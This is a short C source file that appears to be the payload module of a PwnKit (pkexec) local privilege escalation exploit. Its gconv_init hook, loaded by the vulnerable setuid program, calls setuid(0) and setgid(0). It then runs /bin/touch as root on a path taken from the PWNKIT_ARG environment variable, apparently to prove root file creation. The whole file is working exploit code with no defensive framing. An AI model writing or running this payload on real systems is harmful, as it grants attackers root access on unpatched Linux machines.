#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char *pwnkit_arg = getenv("PWNKIT_ARG"); // 获取环境变量的值
	if (pwnkit_arg) {
		printf("PWNKIT_ARG: %s\n", pwnkit_arg);
	} else {
		printf("PWNKIT_ARG not found\n");
	}

	char * const args[] = { "/bin/touch",pwnkit_arg, NULL };
	char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, environ);
	exit(0);
}


